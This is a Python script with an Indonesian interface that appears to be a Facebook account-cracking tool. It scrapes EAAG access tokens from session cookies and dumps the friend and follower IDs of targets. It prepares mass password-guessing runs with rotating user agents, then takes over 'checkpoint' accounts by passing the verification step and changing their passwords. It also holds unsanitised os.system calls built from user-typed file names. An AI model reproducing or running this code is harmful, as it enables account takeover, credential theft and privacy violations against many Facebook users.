#!/usr/bin/python3
# coding=utf8-

### IMPORT MODULE
import os, sys, re, time, requests, calendar, random,json, uuid, subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ReyTampan
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
from time import sleep as waktu
try:
    import requests
except ImportError:
    print("\n [!] module requests belum terinstall")
    os.system("pip install requests")
try:
    import bs4
except ImportError:
    print("\n [!] module bs4 belum terinstall")
    os.system("pip install bs4")
try:
    import concurrent.futures
except ImportError:
    print("\n [!] module futures belum terinstall")
    os.system("pip install futures")
### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     
### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
url = "https://mbasic.facebook.com"
ses = requests.Session()
id = []
id2 = []
cp = []
ok = []
opsi = []
ubahP = []
pwbaru = []
freetoken = []
andra = []
gass = []
data = {}
data2 = {}
loop = 0
url_lookup = "https://lookup-id.com/"
headerz = random.choice(['Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'])
try:ugen = open('user2.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
#################
def convert_cookie(cok):
    return ( ";".join([str(i[0])+'='+str(i[1]) for i in cok.items()]) )
#################
def convert(cookies): 
    cok = 'datr=' + cookies['datr'] + ';' + ('c_user=' + cookies['c_user']) + ';' + ('fr=' + cookies['fr']) + ';' + ('xs=' + cookies['xs'])
### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
cv_hr = {"Sunday":"Minggu", "Monday":"Senin", "Tuesday":"Selasa", "Wednesday":"Rabu", "Thursday":"Kamis", "Friday":"Jumat", "Saturday":"Sabtu"}
nama_hari = cv_hr[hr] 
tanggal = ("%s-%s-%s-%s"%(nama_hari, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

### BAGIAN CEK SERVER ###
def kata_online():
    os.system('clear')
    logo()
    print("\n [+] status server : %sOnline%s"%(H,N))
    jalan(' [!] silahkan gunakan script ini,tapi jangan diperjual belikan ya :)')
def kata_mainten():
    os.system('clear')
    logo()
    print("\n [+] status server : %sMaintenance%s"%(K,N))
    jalan(' [!] mohon maaf sekarang ini script tidak dapat di akses karena dalam proses update :(')
def kata_clos():
    os.system('clear')
    logo()
    print('\n [+] status server : %sClose%s'%(M,N))
    jalan(' [!] mohon maaf akses script ini sudah ditutup ;(')
def cek():
    ser = requests.get("https://pastebin.com/raw/R1X7Kg6R").text.strip()
    if "ONLINE" in ser:
        kata_online();time.sleep(3)
        menu()
    elif "MAINTENANCE" in ser:
        kata_mainten();time.sleep(3)
        exit()
    else:
        kata_clos();time.sleep(3)
        exit()
### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s   _____ _                 __   _    ____ __
  / ___/(_)___ ___  ____  / /__| |  / / // /
  \__ \/ / __ `__ \/ __ \/ / _ \ | / / // /_
 ___/ / / / / / / / /_/ / /  __/ |/ /__  __/
/____/_/_/ /_/ /_/ .___/_/\___/|___/  /_/   
                /_/                         """%(N))
### BAGIAN LOGIN NEW ###
def login():
    os.system('clear')
    logo()
    print("-"*50)
    print(' [1]. login menggunakan token')
    print(' [2]. login menggunakan cookies')
    #print(' [3]. login menggunakan kredensial')
    #print(' [4]. login menggunakan free token')
    print("-"*50)
    rey = input(' [?] pilih : ')
    if rey in ['1','01']:
        token = input(' [+] masukan token : ')
        log_token(token)
    elif rey in ['2','02']:
        cookie = input(' [+] masukan cookie : ')
        log_coki(cookie)
    elif rey in ['3','03']:
        kredensial()
    elif rey in ['4','04']:
        free_token()
    else:login()
def log_token(token):
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("token.txt", 'w')
		zedd.write(token)
		zedd.close()
		print('\n [+] user aktif, selamat datang %s%s%s'%(K,nama,N))
		time.sleep(1)
		menu()
	except KeyError:
		exit("\n [!] token kadaluwarsa")
def log_coki(cookie):
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text) 
		nama = ses.get("https://graph.facebook.com/me?access_token="+find_token.group(1)).json()["name"] 
		open("token.txt", "w").write(find_token.group(1)) 
		open("cookie.txt", "w").write(cookie)
		menu()
	except Exception as e: 
		os.system("rm -f token.txt cookie.txt") 
		exit("\n [!] cookie kadaluwarsa") 
def kredensial():
	user = input(" [+] email      : ") 
	pw = input(" [+] kata sandi : ") 
	try:
		header = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"} 
		r = ses.get(f"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header) 
		das = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"} 
		header1 = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"} 
		ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False) 
		if 'c_user' in ses.cookies.get_dict(): 
			headcok = {'Host': 'business.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'content-type': 'text/html; charset=utf-8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'} 
			data2 = ses.get("https://business.facebook.com/business_locations", headers=headcok) 
			find_token = re.search('(EAAG\\w+)', data2.text) 
			token = find_token.group(1) 
			cookie = convert(ses.cookies.get_dict()) 
			open("cookie.txt", "w").write(cookie) 
			open("token.txt", "w").write(token) 
			if 'EAA' in token: 
				print("-"*50) 
				print(f" [+] token   : {token}") 
				print(f" [+] cookies : {cookie}") 
				time.sleep(5) 
				menu() 
		elif 'checkpoint' in ses.cookies.get_dict(): 
			exit(' [!] akun anda terkena checkpoint') 
		else: 
			exit("\n [!] email atau kata sandi salah") 
	except AttributeError: 
		exit("\n [!] email atau kata sandi salah")
def free_token(): 
	num = 0 
	llink_token = ses.get("https://free.facebook.com/100032577396395/posts/603362670759641/?app=fbl") 
	ttoken_free = re.findall("EAA\w+", llink_token.text) 
	for nnaa in ttoken_free: 
		num += 1 
		if len(nnaa)>=37: 
			freetoken.append(nnaa)
			print("-"*50)
			print(" [%s] %s%s%s"%(num,H,nnaa,N))
	print("-"*50)
	pil = input("\n [?] pilih token untuk login : ")
	if pil in[""," "]: 
		login() 
		tolkau = freetoken[int(pil)-1] 
		log_token(tolkau) 
		exit("%s"%(e))
### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        uid = a['id']
        ttl = a['birthday']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token/cookie kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        os.system('rm -f cookie.txt')
        login()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))
    logo()
    print("-"*50)
    print(" Nama        : %s"%(nama))
    print(" ID          : %s"%(uid))
    print(" Tgl. Lahir  : %s"%(ttl))
    print("-"*50)
    print(" [1]. crack teman/publik")
    print(" [2]. crack daftar followers")
    print(" [3]. cek opsi akun cp")
    print(" [4]. lihat hasil crack")
    print(" [5]. setting user agent")
    #print(' [6]. hapus lisensi key')
    print(" [0]. logout (hapus token)")
    print("-"*50)
    asw = input(" [?] pilih menu : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "2":
    	follow()
    elif asw == "3":
    	cekopsi()
    elif asw == "4":
    	cekhasil()
    elif asw == "5":
    	gantiua()
    elif asw == "6":
    	os.system('rm -rf .license.txt')
    	print("-"*50)
    	jalan(" [✓] berhasil menghapus lisensi ")
    	exit()
    elif asw == "0":
    	os.system('rm -rf token.txt')
    	os.system('rm -rf cookie.txt')
    	print("-"*50)
    	jalan(" [✓] berhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih jawaban dengan bener ! ")
    	menu() 
def gantiua():
	print("-"*50)
	ajg = input(" [?] masukan ua : ")
	if ajg in[""]:
		menu()
	else:
		try:
			zedd = open('ugent.txt', 'w')
			zedd.write(ajg)
			zedd.close()
			print("-"*50)
			print(" [✓] berhasil mengganti ua")
			input(" [*] tekan enter untuk kembali ke menu")
			menu()
		except KeyError:
			exit()
### CEK OPSI ###
def cekopsi():
	dirs = os.listdir("CP")
	print("-"*50)
	for file in dirs:
		print(" [*] CP/"+file)
	print("-"*50)
	files = input(" [?] file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n [!] nama file %s tidak tersedia"%(files))
	ubahpw()
	print(' [+] total akun : %s'%(str(len(buka_baju))))
	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek')
	print("-"*50)
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(" [+] cek : %s%s%s"%(K,kontol.replace(" [CP] ",""),N))
		try:
			cek_opsi(titid[0].replace(" [CP] ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
		print("-"*50)
	print("\n [!] cek akun sudah selesai...")
	input(" [*] tekan enter untuk kembali ke menu ")
	time.sleep(1)
	menu()
def ubahpw():
	print("-"*50)
	pw=input(" [?] ubah sandi tap yes?[Y/t]: ")
	if pw == "Y" or pw == "y":
		ubahP.append("y")
		pw2=input(" [?] masukan sandi : ")
		if len(pw2) <= 5:
			exit(" [!] kata sandi minimal 6 karakter ")
		else:
			pwbaru.append(pw2)
	else:
		pass
def cek_opsi(user,pw):
	global loop,ubahP,pwbaru
	session=requests.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
	})
	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r %s[!] akun terkunci tampilan sesi new%s"%(M,N))
		else:
			loop+=1
			print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "checkpoint" in session.cookies.get_dict():
		loop+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print("\r [+] terdapat "+str(len(cek))+" opsi ")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(user,pw,session,response,link2)
				else:
					print("\r %s[✓] akun tap yes, silahkan login di fb lite%s						\n"%(H,N))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
			else:
				print("Kesalahan!")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print("  [%s] %s"%(str(number),opsi[0]))
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print("  [%s] %s"%(str(number),opsi[0]))
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		loop+=1
		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
def ubah_pw(user,pw,session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print("\r [✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
		cek_apk(coki)
def cek_apk(coki):
	hit1, hit2 = 0,0
	session=requests.Session()
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print("{P}[+] Apk yang terkait:")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			print(f"  {N}[+] Apk Aktif :")
			print("   [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
		else:
			print(f"  {N}[+] Apk Aktif :")
			apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				print(f"   [{H}{hit1}{N}]. {N}{muncul} -> {H}{ditambahkan[hit2]}{N}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
			print(f"  {N}[+] Apk kadaluarsa :")
			print("   [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
		else:
			hit1,hit2=0,0
			print(f"  {N}[+] Apk kadaluarsa :")
			apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				print(f"   [{H}{hit1}{N}]. {N}{muncul} -> {M}{kadaluarsa[hit2]}{N}")
				hit2+=1
	else:
		print('\n %s[!] cookies anda kadaluwarsa%s'%(M,N));waktu(1)
	print("")
### CEK HASIL ### 
def cekhasil():
	print("-"*50)
	print(' [1]. lihat hasil crack OK ')
	print(' [2]. lihat hasil crack CP ')
	print("-"*50)
	anjg = input(' [?] pilih : ')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print("-"*50)
		for file in dirs:
			print(" [*] "+file)
		try:
			print("-"*50)
			file = input(" [?] file : ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		print("-"*50)
		os.system("cat OK/%s"%(file))
		print("-"*50)
		input(" [*] tekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print("-"*50)
		for file in dirs:
			print(" [*] "+file)
		try:
			print("-"*50)
			file = input(" [?] file : ")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		print("-"*50)
		os.system("cat CP/%s"%(file))
		print("-"*50)
		input(" [*] tekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()
def massal():
	try:
		token=open("token.txt","r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	try:tanya_total=int(input(" [+] masukan jumlah target : "))
	except:tanya_total=1
	for t in range(tanya_total):
		t +=1
		idt=input(" [?] masukan username atau id %s : "%(t))
		if idt in[""]:
			print(' [!] isi dengan yang bener')
		elif(re.findall("\w+",idt)):
			r = requests.get("https://mbasic.facebook.com/"+idt).text
			try:
				user = re.findall('\;rid\=(\d+)\&',str(r))[0]
			except:
				user = idt
		try:
			for i in requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(user,token)).json()["friends"]["data"]:
				id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit(" [!] akun tidak tersedia atau list teman private")
	print(" [+] total id : %s"%(len(id)))
	atursandi()
### DUMP PUBLIK ###
def publik():
	try:
		token=open("token.txt","r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print(' [1] single crack   [2] massal crack')
	rue=input(" [?] pilih : ")
	print("-"*50)
	if rue in ["1","01"]:
		idt=input(" [?] masukan username atau id : ")
		if idt in[""]:
			menu()
		elif(re.findall("\w+",idt)):
			r = requests.get("https://mbasic.facebook.com/"+idt).text
			try:
				user = re.findall('\;rid\=(\d+)\&',str(r))[0]
			except:
				user = idt
	elif rue in ["2","02"]:
		massal()
	else:menu()
	print("-"*50)
	print(" [1] crack all id   [2] crack id old")
	ask=input(" [?] pilih : ")
	if ask in[""]:
		menu()
	elif ask in["1"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(user,token)).json()["friends"]["data"]:
				id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit(" [!] akun tidak tersedia atau list teman private")
		print(" [+] total id : %s"%(len(id)))
		atursandi()
	elif ask in["2"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(user,token)).json()["friends"]["data"]:
				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
					id.append(i["id"]+"<=>"+i["name"])
				elif i['id'][:10] in ['1000000000']:
					id.append(i["id"]+"<=>"+i["name"])
				elif i['id'][:9] in ['100000000']:
					id.append(i["id"]+"<=>"+i["name"])
				elif i['id'][:8] in ['10000000']:
					id.append(i["id"]+"<=>"+i["name"])
				elif i['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
					id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit(" [!] akun tidak tersedia atau list teman private")
		print(" [+] total id : %s"%(len(id)))
		atursandi()
def follow():
	try:
		token=open("token.txt","r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	print("-"*50)
	idt=input(" [?] masukan username atau id : ")
	if idt in[""]:
		menu()
	elif(re.findall("\w+",idt)):
		r = requests.get("https://mbasic.facebook.com/"+idt).text
		try:
			user = re.findall('\;rid\=(\d+)\&',str(r))[0]
		except:
			user = idt
	else:menu()
	print("-"*50)
	print(" [1] crack all id   [2] crack id old")
	ask=input(" [?] pilih : ")
	if ask in[""]:
		menu()
	elif ask in["1"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=9999999&access_token=%s"%(user, token)).json()["data"]:
				id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit(" [!] akun tidak tersedia atau list followers private")
		print(" [+] total id : %s"%(len(id)))
		atursandi()
	elif ask in["2"]:
		try:
			for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=9999999&access_token=%s"%(user, token)).json()["data"]:
				if len(i['id'])==6 or len(i['id'])==7 or len(i['id'])==8 or len(i['id'])==9 or len(i['id'])==10:
					id.append(i["id"]+"<=>"+i["name"])
				elif i['id'][:10] in ['1000000000']:
					id.append(i["id"]+"<=>"+i["name"])
				elif i['id'][:9] in ['100000000']:
					id.append(i["id"]+"<=>"+i["name"])
				elif i['id'][:8] in ['10000000']:
					id.append(i["id"]+"<=>"+i["name"])
				elif i['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
					id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			exit(" [!] akun tidak tersedia atau list followers private")
		print(" [+] total id : %s"%(len(id)))
		atursandi()
def atursandi():
    print("-"*50)
    print(" [1] otomatis  [2] manual")
    ask=input(" [?] pilih : ")
    if ask in[""]:
        menu()
    elif ask in["1"]:
        otomatis()
    elif ask in["2"]:
        manual()
    else:
        exit()
def atur_id():
    print("-"*50)
    print(' [+] pilih urutan crack id dari yang')
    print(' [1] tertua  [2] termuda  [3] random')
    qow = input(' [?] pilih : ')
    if qow in ['1','01']:
        for bacot in id:
            id2.append(bacot)
    elif qow in ['2','02']:
        for bacot in id:
            id2.insert(0,bacot)
    elif qow in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:exit()
### MUNCUL APK ###
def show_apk():
    print("-"*50)
    print(' [?] munculkan aplikasi terkait ')
    print(' [1] munculkan  [2] tidak')
    awk = input(' [?] pilih : ')
    if awk in ['1','01']:
        gass.append("y")
    elif awk in ['2','02']:
        gass.append("t")
    else:exit()
### ATUR UA ###
def aturua():
    print("-"*50)
    print(' [1] single UA  [2] random UA')
    tanya=input(" [?] pilih : ")
    if tanya in ['1','01']:
        andra.append('single')
    elif tanya in ['2','02']:
        andra.append('random')
    else:exit()
### OTOMATIS ###
def otomatis():
	print("-"*50)
	print(' [+] pilih urutan crack id dari yang')
	print(' [1] tertua  [2] termuda  [3] random')
	qow = input(' [?] pilih : ')
	if qow in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif qow in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	elif qow in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:exit()
	print("-"*50)
	print(' [1] single UA  [2] random UA')
	tanya=input(" [?] pilih : ")
	if tanya in ['1','01']:
		andra.append('single')
	elif tanya in ['2','02']:
		andra.append('random')
	else:exit()
	print("-"*50)
	print(' [?] munculkan aplikasi terkait ')
	print(' [1] munculkan  [2] tidak')
	awk = input(' [?] pilih : ')
	if awk in ['1','01']:
		gass.append("y")
	elif awk in ['2','02']:
		gass.append("t")
	else:exit()
